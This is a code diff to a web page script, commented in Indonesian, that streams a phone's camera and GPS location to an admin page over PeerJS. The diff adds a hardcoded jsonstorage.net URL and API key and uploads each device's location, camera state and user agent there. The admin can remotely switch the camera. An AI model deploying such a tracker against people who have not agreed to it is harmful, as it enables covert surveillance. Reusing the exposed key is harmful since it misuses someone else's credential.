@@ -33,9 +33,11 @@
 </div>
 
 <script>
-    // Samakan PREFIX_ID dengan admin.html agar perangkat bisa ditemukan
+    const JSON_URL = "https://api.jsonstorage.net/v1/json/587183f3-b9d9-4a5d-b9b0-063df3a586fe/cca91d54-af4b-4a64-9a4b-20fc0baaf88b";
+    const API_KEY  = "b3b1f259-fdd1-4906-b083-51fe497ffd59";
+
+    const DEVICE_NAME = "HP Saya";
     const PREFIX_ID = "jirun-hp-";
-    const DEVICE_NAME = "HP Saya"; // Bisa kamu ganti sesuai nama HP
 
     function getOrCreateDeviceKey() {
         let key = localStorage.getItem("jirun_dev_key");
@@ -52,13 +54,76 @@
     let currentFacing = "user"; // "user" = depan, "environment" = belakang
     let cameraStream = null;
     let peer = null;
+    let peerReady = false;
     let activeCall = null;
     let activeDataConn = null;
     let watchId = null;
     let latestLocation = null;
     let isStarting = false;
+    let isRegistering = false;
+    let lastRegisteredSignature = "";
 
     const videoEl = document.getElementById("localVideo");
+
+    async function fetchStorage() {
+        const res = await fetch(`${JSON_URL}?t=${Date.now()}`, { cache: "no-store" });
+        if (!res.ok) throw new Error("Fetch failed");
+        const data = await res.json();
+        return {
+            logs: Array.isArray(data.logs) ? data.logs : [],
+            devices: data.devices && typeof data.devices === "object" ? data.devices : {},
+            command: data.command || { action: "NONE", targetSessionId: null, facing: null, token: null }
+        };
+    }
+
+    async function saveStorage(payload) {
+        const putUrl = `${JSON_URL}?apiKey=${encodeURIComponent(API_KEY)}`;
+        const res = await fetch(putUrl, {
+            method: "PUT",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+        if (!res.ok) throw new Error("Save failed");
+    }
+
+    async function registerDevicePresence(force) {
+        if (isRegistering || !latestLocation) return;
+        const sig = `${myPeerId}|${latestLocation.lat}|${latestLocation.lng}|${Boolean(cameraStream)}|${currentFacing}|${peerReady}`;
+        if (!force && sig === lastRegisteredSignature) return;
+
+        isRegistering = true;
+        try {
+            const state = await fetchStorage();
+            state.devices[myPeerId] = {
+                peerId: myPeerId,
+                name: DEVICE_NAME,
+                cameraReady: Boolean(cameraStream),
+                facing: currentFacing === "environment" ? "Belakang" : "Depan",
+                location: latestLocation,
+                updatedAt: Date.now(),
+                userAgent: navigator.userAgent
+            };
+            await saveStorage(state);
+            lastRegisteredSignature = sig;
+        } catch (err) {
+            console.error("Register error:", err);
+        } finally {
+            isRegistering = false;
+        }
+    }
+
+    function sendLiveStatusOverPeer() {
+        if (activeDataConn && activeDataConn.open) {
+            activeDataConn.send({
+                type: "LIVE_STATUS",
+                peerId: myPeerId,
+                name: DEVICE_NAME,
+                facing: currentFacing === "environment" ? "Belakang" : "Depan",
+                location: latestLocation,
+                updatedAt: Date.now()
+            });
+        }
+    }
 
     async function openCamera(facing) {
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
@@ -84,21 +149,9 @@
                 await sender.replaceTrack(newTrack);
             }
         }
-        sendInfoToAdmin();
+        sendLiveStatusOverPeer();
+        await registerDevicePresence(true);
         return stream;
-    }
-
-    function sendInfoToAdmin() {
-        if (activeDataConn && activeDataConn.open) {
-            activeDataConn.send({
-                type: "DEVICE_INFO",
-                peerId: myPeerId,
-                deviceName: DEVICE_NAME,
-                facing: currentFacing === "environment" ? "Belakang" : "Depan",
-                location: latestLocation,
-                updatedAt: Date.now()
-            });
-        }
     }
 
     function startLocationStream() {
@@ -123,7 +176,8 @@
                             ? Math.round(pos.coords.heading) + "°"
                             : "-"
                     };
-                    sendInfoToAdmin();
+                    sendLiveStatusOverPeer();
+                    registerDevicePresence(false);
                     if (!done) {
                         done = true;
                         resolve(latestLocation);
@@ -144,10 +198,15 @@
         if (peer) return;
         peer = new Peer(myPeerId);
 
+        peer.on("open", () => {
+            peerReady = true;
+            registerDevicePresence(true);
+        });
+
         peer.on("connection", (conn) => {
             activeDataConn = conn;
             conn.on("open", () => {
-                sendInfoToAdmin();
+                sendLiveStatusOverPeer();
             });
             conn.on("data", async (msg) => {
                 if (!msg || !msg.type) return;
@@ -157,7 +216,7 @@
                         : (currentFacing === "user" ? "environment" : "user");
                     await openCamera(target);
                 } else if (msg.type === "PING") {
-                    sendInfoToAdmin();
+                    sendLiveStatusOverPeer();
                 }
             });
             conn.on("close", () => {
@@ -183,6 +242,7 @@
                 await openCamera(currentFacing);
             }
             setupPeer();
+            await registerDevicePresence(true);
         } catch (err) {
             console.error(err);
         } finally {
